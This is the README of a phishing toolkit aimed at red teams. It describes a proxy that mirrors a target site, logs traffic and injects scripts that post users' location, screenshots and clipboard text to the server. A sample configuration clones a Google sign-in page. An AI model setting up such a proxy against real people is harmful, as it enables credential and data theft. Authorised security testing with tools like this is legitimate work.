# Ares
Phishing toolkit for red teams and pentesters.

Ares allows security testers to create a phishing environment easily. Ares acts as a proxy between the original site and the phished site, and allows modifications and injects. 

## Gophish

Ares will work seamless with Gophish, where you'll use Ares for the landing page functionality. 

## Features

* transparant 1 to 1 of original site
* modify specific paths to return static files, rendered as Go templates
* create redirects (short urls)
* inject scripts into target site
* support ssl (using lets encrypt)
* multiple targets / hosts
* enhanced filtering on path, method, ip addresses and useragent
* all requests and responses are being logged into Elasticsearch
* all data is being stored for caching / retrieval

## Todo

* create frontend for configuration, monitoring and dashboard
* send emails from toolkit

## Installation

Make sure you have Go 1.7 installed. 

```
git clone git@github.com:dutchcoders/ares.git
go run cmd/main.go  -c config.toml
```

## Injects

The injects can be inserted in the target site, currently we have the following injects:

* **location** will ask the client for longitude and latitude and post to server
* **snap** will generate screenshots and post to server
* **clipboard** will copy text from clipboard and post to server

## Configuration

```
listener = "127.0.0.1:8080"
tlslistener = "127.0.0.1:8443"

data = "/data"
elasticsearch_url = "http://127.0.0.1:9200/"

#socks = "socks5://127.0.0.1:9050"

[[host]]
host = "google.lvh.me"
target = "https://accounts.google.com/"

[[host.action]]
path = "^.*"
action = "inject"
method = ["GET"]
scripts = ["injects/location.js", "injects/snap.js", "injects/clipboard.js"]

[[host.action]]
path = "^/dump"
action = "serve"
body = ""

[[host.action]]
path = "^/login.html"
action = "replace"
method = ["GET"]
regex = "-ab-axxb-"
replace = "$1"

[[host.action]]
path = "^/login.html"
action = "file"
method = ["GET"]
file = "static/login.html"

[[host.action]]
path = "^/login.html"
action = "file"
method = ["POST"]
file = "static/login-failed.html"

[[host.action]]
path = "^/short-url"
statuscode = 302
action = "redirect"
location = "/login.html"

[[logging]]
output = "stdout"
level = "info"
```
